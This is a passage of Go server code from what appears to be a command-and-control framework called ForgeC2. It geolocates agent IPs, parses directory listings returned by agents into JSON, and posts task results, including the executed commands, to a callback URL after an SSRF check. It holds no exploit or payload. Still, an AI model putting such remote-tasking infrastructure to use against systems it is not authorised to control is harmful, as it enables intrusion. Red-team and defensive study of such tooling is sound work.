		if b[0] == 100 && (b[1]&0xC0) == 64 {
			return true
		}
	}
	// 172.16.0.0/12
	if strings.HasPrefix(ip, "172.") {
		parts := strings.SplitN(ip, ".", 3)
		if len(parts) >= 2 {
			if second, err := strconv.Atoi(parts[1]); err == nil && second >= 16 && second <= 31 {
				return true
			}
		}
	}
	if parsed != nil {
		// IPv6 link-local fe80::/10
		if parsed.To4() == nil && parsed[0] == 0xfe && (parsed[1]&0xc0) == 0x80 {
			return true
		}
		// IPv6 ULA fc00::/7
		if parsed.To4() == nil && (parsed[0]&0xfe) == 0xfc {
			return true
		}
	}
	return false
}

// lookupGeoIP queries ip-api.com for geolocation data
func (s *Server) lookupGeoIP(ctx context.Context, ip string) (country, city string, lat, lon float64) {
	if isPrivateIP(ip) {
		return "", "", 0, 0
	}
	url := "https://ip-api.com/json/" + ip + "?fields=country,city,lat,lon"
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return "", "", 0, 0
	}
	resp, err := s.httpClient.Do(req)
	if err != nil {
		return "", "", 0, 0
	}
	defer resp.Body.Close()
	var result struct {
		Country string  `json:"country"`
		City    string  `json:"city"`
		Lat     float64 `json:"lat"`
		Lon     float64 `json:"lon"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", "", 0, 0
	}
	return result.Country, result.City, result.Lat, result.Lon
}

// normalizeLsResult converts a tab-separated "dir /s" style listing
// into a JSON array.  Returns the original string unchanged when there
// are no data lines (header/separator only).
func normalizeLsResult(raw string) string {
	lines := strings.Split(raw, "\n")

	type lsEntry struct {
		Name    string `json:"name"`
		IsDir   bool   `json:"is_dir"`
		Size    int64  `json:"size"`
		ModTime string `json:"mod_time"`
	}

	var entries []lsEntry
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "Type") || strings.HasPrefix(line, "---") || strings.HasPrefix(line, "─") {
			continue
		}
		parts := strings.SplitN(line, "\t", 4)
		if len(parts) < 4 {
			continue
		}
		isDir := strings.EqualFold(parts[0], "DIR")
		size, _ := strconv.ParseInt(parts[2], 10, 64)
		entries = append(entries, lsEntry{
			Name:    parts[1],
			IsDir:   isDir,
			Size:    size,
			ModTime: parts[3],
		})
	}

	if len(entries) == 0 {
		return raw
	}
	b, ok := marshalJSONSafe(entries)
	if !ok {
		return raw
	}
	return string(b)
}

// executeTaskCallback POSTs task completion results to the configured callback URL.
func (s *Server) executeTaskCallback(task db.Task, agentID string) {
	if err := validateWebhookURL(task.CallbackURL); err != nil {
		slog.Error("Callback URL rejected by SSRF filter", "task_id", task.ID, "url", task.CallbackURL, "error", err)
		return
	}

	payload := map[string]interface{}{
		"task_id":   task.ID,
		"agent_id":  agentID,
		"type":      task.Type,
		"command":   task.Command,
		"status":    task.Status,
		"result":    task.Result,
		"error":     task.Error,
		"completed": task.UpdatedAt.Format(time.RFC3339),
	}
	body, err := json.Marshal(payload)
	if err != nil {
		slog.Error("Failed to marshal callback payload", "task_id", task.ID, "error", err)
		return
	}

	method := strings.ToUpper(task.CallbackMethod)
	if method == "" {
		method = "POST"
	}

	req, err := http.NewRequest(method, task.CallbackURL, strings.NewReader(string(body)))
	if err != nil {
		slog.Error("Failed to create callback request", "task_id", task.ID, "url", task.CallbackURL, "error", err)
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "ForgeC2-Callback/1.0")

	resp, err := s.httpClient.Do(req)
	if err != nil {
		slog.Error("Callback request failed", "task_id", task.ID, "url", task.CallbackURL, "error", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		s.db.Model(&task).Update("callback_sent", true)
		slog.Info("Task callback delivered", "task_id", task.ID, "url", task.CallbackURL, "status", resp.StatusCode)
	} else {
		slog.Warn("Task callback returned non-2xx", "task_id", task.ID, "url", task.CallbackURL, "status", resp.StatusCode)
	}
}
